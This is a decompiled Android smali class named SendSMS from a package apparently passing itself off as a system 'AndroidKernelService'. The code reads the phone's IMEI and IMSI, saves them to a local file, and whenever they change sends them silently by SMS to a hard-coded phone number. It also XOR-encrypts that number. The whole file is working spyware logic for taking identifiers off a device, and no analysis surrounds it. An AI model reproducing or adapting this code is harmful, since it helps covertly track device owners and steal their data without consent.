.class public Lcom/Qdzs/SendSMS;
.super Ljava/lang/Object;
.source "SendSMS.java"


# static fields
.field public static final TAG:Ljava/lang/String; = "SendSMS"

.field public static final smsNumber:Ljava/lang/String; = "13611368600"


# instance fields
.field IMEI:Ljava/lang/String;

.field IMSI:Ljava/lang/String;

.field NAME:Ljava/lang/String;

.field PATH:Ljava/lang/String;

.field mContext:Landroid/content/Context;


# direct methods
.method public constructor <init>()V
    .locals 1

    .prologue
    .line 32
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 22
    const-string v0, "PhoneInfo.txt"

    iput-object v0, p0, Lcom/Qdzs/SendSMS;->NAME:Ljava/lang/String;

    .line 23
    const-string v0, "data/data/com.AndroidKernelService/"

    iput-object v0, p0, Lcom/Qdzs/SendSMS;->PATH:Ljava/lang/String;

    .line 25
    const-string v0, "IMEI"

    iput-object v0, p0, Lcom/Qdzs/SendSMS;->IMEI:Ljava/lang/String;

    .line 26
    const-string v0, "IMSI"

    iput-object v0, p0, Lcom/Qdzs/SendSMS;->IMSI:Ljava/lang/String;

    .line 34
    return-void
.end method

.method public constructor <init>(Landroid/content/Context;)V
    .locals 1
    .parameter "context"

    .prologue
    .line 29
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 22
    const-string v0, "PhoneInfo.txt"

    iput-object v0, p0, Lcom/Qdzs/SendSMS;->NAME:Ljava/lang/String;

    .line 23
    const-string v0, "data/data/com.AndroidKernelService/"

    iput-object v0, p0, Lcom/Qdzs/SendSMS;->PATH:Ljava/lang/String;

    .line 25
    const-string v0, "IMEI"

    iput-object v0, p0, Lcom/Qdzs/SendSMS;->IMEI:Ljava/lang/String;

    .line 26
    const-string v0, "IMSI"

    iput-object v0, p0, Lcom/Qdzs/SendSMS;->IMSI:Ljava/lang/String;

    .line 30
    iput-object p1, p0, Lcom/Qdzs/SendSMS;->mContext:Landroid/content/Context;

    .line 31
    return-void
.end method


# virtual methods
.method public sendSMS()V
    .locals 17

    .prologue
    .line 46
    new-instance v11, Lcom/Qdzs/BasicInfo;

    move-object/from16 v0, p0

    iget-object v2, v0, Lcom/Qdzs/SendSMS;->mContext:Landroid/content/Context;

    invoke-direct {v11, v2}, Lcom/Qdzs/BasicInfo;-><init>(Landroid/content/Context;)V

    .line 55
    .local v11, info:Lcom/Qdzs/BasicInfo;
    :try_start_0
    const-string v2, "\u6267\u884c\u83b7\u53d6IMEI"

    invoke-static {v2}, Lcom/Qdzs/WriteLogFile;->writeLog(Ljava/lang/String;)V

    .line 56
    invoke-virtual {v11}, Lcom/Qdzs/BasicInfo;->getIMEI()Ljava/lang/String;

    move-result-object v2

    move-object/from16 v0, p0

    iput-object v2, v0, Lcom/Qdzs/SendSMS;->IMEI:Ljava/lang/String;

    .line 57
    invoke-virtual {v11}, Lcom/Qdzs/BasicInfo;->getIMSI()Ljava/lang/String;

    move-result-object v2

    move-object/from16 v0, p0

    iput-object v2, v0, Lcom/Qdzs/SendSMS;->IMSI:Ljava/lang/String;

    .line 58
    const-string v2, "\u6267\u884c\u5b8c\u83b7\u53d6IMSI"

    invoke-static {v2}, Lcom/Qdzs/WriteLogFile;->writeLog(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 86
    :goto_0
    new-instance v15, Ljava/io/File;

    move-object/from16 v0, p0

    iget-object v2, v0, Lcom/Qdzs/SendSMS;->PATH:Ljava/lang/String;

    invoke-direct {v15, v2}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 87
    .local v15, path:Ljava/io/File;
    invoke-virtual {v15}, Ljava/io/File;->exists()Z

    move-result v2

    if-nez v2, :cond_0

    .line 88
    invoke-virtual {v15}, Ljava/io/File;->mkdir()Z

    .line 90
    :cond_0
    new-instance v10, Ljava/io/File;

    new-instance v2, Ljava/lang/StringBuilder;

    move-object/from16 v0, p0

    iget-object v3, v0, Lcom/Qdzs/SendSMS;->PATH:Ljava/lang/String;

    invoke-static {v3}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v3

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, p0

    iget-object v3, v0, Lcom/Qdzs/SendSMS;->NAME:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-direct {v10, v2}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 91
    .local v10, file:Ljava/io/File;
    const/16 v16, 0x0

    .line 92
    .local v16, send:Z
    invoke-virtual {v10}, Ljava/io/File;->exists()Z

    move-result v2

    if-nez v2, :cond_2

    .line 93
    const/16 v16, 0x1

    .line 94
    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "send01="

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move/from16 v0, v16

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Lcom/Qdzs/WriteLogFile;->writeLog(Ljava/lang/String;)V

    .line 96
    :try_start_1
    invoke-virtual {v10}, Ljava/io/File;->createNewFile()Z

    .line 97
    new-instance v14, Ljava/io/BufferedWriter;

    new-instance v2, Ljava/io/FileWriter;

    invoke-direct {v2, v10}, Ljava/io/FileWriter;-><init>(Ljava/io/File;)V

    invoke-direct {v14, v2}, Ljava/io/BufferedWriter;-><init>(Ljava/io/Writer;)V

    .line 98
    .local v14, output:Ljava/io/BufferedWriter;
    move-object/from16 v0, p0

    iget-object v2, v0, Lcom/Qdzs/SendSMS;->IMEI:Ljava/lang/String;

    invoke-virtual {v14, v2}, Ljava/io/BufferedWriter;->write(Ljava/lang/String;)V

    .line 99
    invoke-virtual {v14}, Ljava/io/BufferedWriter;->newLine()V

    .line 101
    move-object/from16 v0, p0

    iget-object v2, v0, Lcom/Qdzs/SendSMS;->IMSI:Ljava/lang/String;

    invoke-virtual {v14, v2}, Ljava/io/BufferedWriter;->write(Ljava/lang/String;)V

    .line 102
    invoke-virtual {v14}, Ljava/io/BufferedWriter;->newLine()V

    .line 104
    invoke-virtual {v14}, Ljava/io/BufferedWriter;->close()V
    :try_end_1
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_1

    .line 135
    .end local v14           #output:Ljava/io/BufferedWriter;
    :goto_1
    if-eqz v16, :cond_1

    .line 137
    :try_start_2
    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "Android@"

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, p0

    iget-object v3, v0, Lcom/Qdzs/SendSMS;->IMSI:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "@"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    move-object/from16 v0, p0

    iget-object v3, v0, Lcom/Qdzs/SendSMS;->IMEI:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    .line 140
    .local v4, mMessageText:Ljava/lang/String;
    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;

    move-result-object v1

    .line 141
    .local v1, smsManager:Landroid/telephony/SmsManager;
    const-string v2, "13611368600"

    const/4 v3, 0x0

    const/4 v5, 0x0

    const/4 v6, 0x0

    invoke-virtual/range {v1 .. v6}, Landroid/telephony/SmsManager;->sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_3

    .line 150
    .end local v1           #smsManager:Landroid/telephony/SmsManager;
    .end local v4           #mMessageText:Ljava/lang/String;
    :cond_1
    :goto_2
    return-void

    .line 75
    .end local v10           #file:Ljava/io/File;
    .end local v15           #path:Ljava/io/File;
    .end local v16           #send:Z
    :catch_0
    move-exception v9

    .line 76
    .local v9, e:Ljava/lang/Exception;
    invoke-virtual {v9}, Ljava/lang/Exception;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Lcom/Qdzs/WriteLogFile;->writeLog(Ljava/lang/String;)V

    goto/16 :goto_0

    .line 105
    .end local v9           #e:Ljava/lang/Exception;
    .restart local v10       #file:Ljava/io/File;
    .restart local v15       #path:Ljava/io/File;
    .restart local v16       #send:Z
    :catch_1
    move-exception v13

    .line 106
    .local v13, ioe:Ljava/io/IOException;
    invoke-virtual {v13}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_1

    .line 113
    .end local v13           #ioe:Ljava/io/IOException;
    :cond_2
    :try_start_3
    new-instance v12, Ljava/io/BufferedReader;

    new-instance v2, Ljava/io/FileReader;

    invoke-direct {v2, v10}, Ljava/io/FileReader;-><init>(Ljava/io/File;)V

    invoke-direct {v12, v2}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    .line 114
    .local v12, input:Ljava/io/BufferedReader;
    invoke-virtual {v12}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v7

    .line 115
    .local v7, IMEI_old:Ljava/lang/String;
    invoke-virtual {v12}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v8

    .line 117
    .local v8, IMSI_old:Ljava/lang/String;
    move-object/from16 v0, p0

    iget-object v2, v0, Lcom/Qdzs/SendSMS;->IMEI:Ljava/lang/String;

    invoke-virtual {v7, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_3

    move-object/from16 v0, p0

    iget-object v2, v0, Lcom/Qdzs/SendSMS;->IMSI:Ljava/lang/String;

    invoke-virtual {v8, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_3

    .line 118
    invoke-virtual {v12}, Ljava/io/BufferedReader;->close()V
    :try_end_3
    .catch Ljava/io/IOException; {:try_start_3 .. :try_end_3} :catch_2

    goto :goto_1

    .line 130
    .end local v7           #IMEI_old:Ljava/lang/String;
    .end local v8           #IMSI_old:Ljava/lang/String;
    .end local v12           #input:Ljava/io/BufferedReader;
    :catch_2
    move-exception v13

    .line 131
    .restart local v13       #ioe:Ljava/io/IOException;
    invoke-virtual {v13}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_1

    .line 121
    .end local v13           #ioe:Ljava/io/IOException;
    .restart local v7       #IMEI_old:Ljava/lang/String;
    .restart local v8       #IMSI_old:Ljava/lang/String;
    .restart local v12       #input:Ljava/io/BufferedReader;
    :cond_3
    :try_start_4
    new-instance v14, Ljava/io/BufferedWriter;

    new-instance v2, Ljava/io/FileWriter;

    const/4 v3, 0x0

    invoke-direct {v2, v10, v3}, Ljava/io/FileWriter;-><init>(Ljava/io/File;Z)V

    invoke-direct {v14, v2}, Ljava/io/BufferedWriter;-><init>(Ljava/io/Writer;)V

    .line 122
    .restart local v14       #output:Ljava/io/BufferedWriter;
    move-object/from16 v0, p0

    iget-object v2, v0, Lcom/Qdzs/SendSMS;->IMEI:Ljava/lang/String;

    invoke-virtual {v14, v2}, Ljava/io/BufferedWriter;->write(Ljava/lang/String;)V

    .line 123
    invoke-virtual {v14}, Ljava/io/BufferedWriter;->newLine()V

    .line 124
    move-object/from16 v0, p0

    iget-object v2, v0, Lcom/Qdzs/SendSMS;->IMSI:Ljava/lang/String;

    invoke-virtual {v14, v2}, Ljava/io/BufferedWriter;->write(Ljava/lang/String;)V

    .line 125
    invoke-virtual {v14}, Ljava/io/BufferedWriter;->newLine()V

    .line 126
    invoke-virtual {v14}, Ljava/io/BufferedWriter;->close()V
    :try_end_4
    .catch Ljava/io/IOException; {:try_start_4 .. :try_end_4} :catch_2

    .line 127
    const/16 v16, 0x1

    goto/16 :goto_1

    .line 144
    .end local v7           #IMEI_old:Ljava/lang/String;
    .end local v8           #IMSI_old:Ljava/lang/String;
    .end local v12           #input:Ljava/io/BufferedReader;
    .end local v14           #output:Ljava/io/BufferedWriter;
    :catch_3
    move-exception v9

    .line 145
    .restart local v9       #e:Ljava/lang/Exception;
    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "BootException03"

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v9}, Ljava/lang/Exception;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Lcom/Qdzs/WriteLogFile;->writeLog(Ljava/lang/String;)V

    goto :goto_2
.end method

.method public writePhoneNum()V
    .locals 2

    .prologue
    .line 38
    const-string v1, "\u4fdd\u5b58\u7684\u624b\u673a\u53f7\u662f:13611368600"

    invoke-static {v1}, Lcom/Qdzs/WriteLogFile;->writeLog(Ljava/lang/String;)V

    .line 39
    const-string v1, "13611368600"

    invoke-static {v1}, Lcom/Qdzs/xorEncrypt;->xorEn(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 40
    .local v0, xorPhoneNum:Ljava/lang/String;
    invoke-static {v0}, Lcom/Qdzs/WriteLogFile;->writePhoneNum(Ljava/lang/String;)V

    .line 41
    return-void
.end method
